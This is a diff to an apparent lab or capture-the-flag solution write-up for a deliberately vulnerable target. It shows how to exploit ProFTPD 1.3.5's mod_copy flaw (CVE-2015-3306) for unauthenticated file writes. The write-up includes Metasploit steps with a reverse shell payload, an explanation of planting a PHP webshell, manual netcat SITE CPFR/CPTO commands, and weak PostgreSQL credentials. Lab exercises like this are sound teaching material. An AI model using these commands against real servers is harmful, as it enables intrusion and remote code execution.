@@ -7,14 +7,18 @@
 
 | # | Service        | Weakness                                              | Category                 |
 |---|----------------|-------------------------------------------------------|--------------------------|
-| 1 | FTP (ProFTPD 1.3.5) | **CVE-2015-3306** `mod_copy` — `SITE CPFR`/`SITE CPTO` arbitrary file read/write (RCE) | Outdated software / RCE |
-| 2 | FTP (ProFTPD 1.3.5) | **Anonymous login enabled**                           | Authentication           |
+| 1 | FTP (ProFTPD 1.3.5) | **CVE-2015-3306** `mod_copy` — unauthenticated `SITE CPFR`/`SITE CPTO` arbitrary file read/write | Outdated software |
+| 2 | Web (Apache+PHP) | **World-writable DocumentRoot** shared with the FTP process → mod_copy drops a PHP webshell → **RCE** | Permissions / RCE |
 | 3 | PostgreSQL     | **Weak admin credentials** `admin` / `123456`, port exposed | Credentials        |
 | – | SSH (OpenSSH)  | Hardened decoy — no root login, key-only auth, locked account | (not vulnerable)  |
 
 This satisfies the assignment: 3+ services, 2+ vulnerabilities, ≥1
-authentication/credential/permission weakness, unauthorized access to data,
-realistic content, and clear-text traffic that can be observed.
+permission/credential weakness, unauthorized access + code execution, realistic
+content, and clear-text traffic that can be observed.
+
+> Note: FTP **anonymous login is disabled** — normal logins fail. The CVE is
+> still exploitable because `SITE CPFR`/`CPTO` are reachable *before*
+> authentication in 1.3.5.
 
 ---
 
@@ -24,45 +28,48 @@ realistic content, and clear-text traffic that can be observed.
 nmap -sV -p- <TARGET_IP>
 ```
 
-Expected: `21/tcp ftp ProFTPD 1.3.5`, `2222/tcp ssh OpenSSH`,
-`5432/tcp postgresql`. The ProFTPD banner (`220 ... ProFTPD 1.3.5 ...`) is the
-tell — 1.3.5 is vulnerable to CVE-2015-3306.
+Expected: `21/tcp ftp ProFTPD 1.3.5`, `80/tcp http Apache`,
+`2222/tcp ssh OpenSSH`, `5432/tcp postgresql`. The ProFTPD banner
+(`220 ... ProFTPD 1.3.5 ...`) is the tell — 1.3.5 is vulnerable to
+CVE-2015-3306. Note the web server on :80 — it shares a filesystem with FTP.
 
 ---
 
-## Flag 1 — FTP file server → `FLAG{GeT_rEkT}`
+## Flag 1 — remote code execution → `FLAG{GeT_rEkT}`
 
-### Easy path (anonymous)
-```bash
-ftp <TARGET_IP>
-# Name: anonymous   (any/empty password)
-ftp> ls
-ftp> get flag.txt
-ftp> get README_FILESHARE.txt
+The flag is at `/var/www/flag.txt` — **outside** the web DocumentRoot, so
+`http://<TARGET_IP>/flag.txt` is a 404. You must execute code and read it.
+
+### The easy way: Metasploit
 ```
-`flag.txt` → `FLAG{GeT_rEkT}`.
-
-### Intended path — demonstrate the actual vulnerability (CVE-2015-3306)
-`mod_copy` lets you copy files **outside** the published share without real
-authentication. Example: read `/etc/passwd` by copying it into the share and
-downloading it.
-
-```bash
-# Control channel (netcat). No login needed for SITE CPFR/CPTO on vulnerable builds.
-nc <TARGET_IP> 21
-SITE CPFR /etc/passwd
-SITE CPTO /srv/ftp/passwd.txt
-# then download /passwd.txt over FTP (anonymous) to prove arbitrary file read
-```
-
-Metasploit equivalent:
-```
+msfconsole
 use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS <TARGET_IP>
+set RPORT 21
+set SITEPATH /var/www/html      # world-writable, served by Apache
+set TARGETURI /                 # DocumentRoot is reachable at /
+set HTTPPORT 80
+set payload cmd/unix/reverse_perl   ; set LHOST <YOUR_IP>   # or a generic/bind payload
+run
+# then in the session:
+cat /var/www/flag.txt           # -> FLAG{GeT_rEkT}
 ```
-(or `auxiliary` modules for the file-copy primitive). Copying an attacker-
-controlled file into an executable/served location is what turns this into
-full RCE in a real engagement — here, arbitrary read/write is enough to prove
-the point.
+
+### How it works (what the module automates)
+1. Connect to FTP (no login). ProFTPD reflects the current command into its
+   process title, i.e. `/proc/self/cmdline`.
+2. Send a command containing a small PHP payload, then
+   `SITE CPFR /proc/self/cmdline` and `SITE CPTO /var/www/html/<name>.php` to
+   copy that PHP into the web root (writable by the ProFTPD process).
+3. Request `http://<TARGET_IP>/<name>.php` — Apache runs it as `www-data`.
+
+Manual proof of the underlying primitive (benign, no payload):
+```
+nc <TARGET_IP> 21         # do NOT log in
+SITE CPFR /etc/hostname
+SITE CPTO /var/www/html/x.txt
+# then: curl http://<TARGET_IP>/x.txt   -> proves unauth write into the web root
+```
 
 ---
 
@@ -91,11 +98,12 @@ nmap -p 5432 --script pgsql-brute <TARGET_IP>      # confirms weak creds
 sudo tcpdump -i any -w forgotten.pcap host <TARGET_IP>
 ```
 Open in Wireshark:
-- **FTP** (port 21) is clear text — the `USER anonymous`, `SITE CPFR/CPTO`
-  commands and the copied file contents are all readable. Use "Follow TCP
-  Stream".
-- **PostgreSQL** (port 5432) startup/auth and the returned rows are visible in
-  clear text as well.
+- **FTP** (port 21) is clear text — the `SITE CPFR/CPTO` commands and the PHP
+  payload are all readable. Use "Follow TCP Stream".
+- **HTTP** (port 80) is clear text — the request that triggers the webshell and
+  its output are visible.
+- **PostgreSQL** (port 5432) auth and the returned rows are visible in clear
+  text as well.
 - **SSH** (port 2222) is encrypted — you can see the connection and version
   exchange but not the payload. Good contrast for the write-up.
 
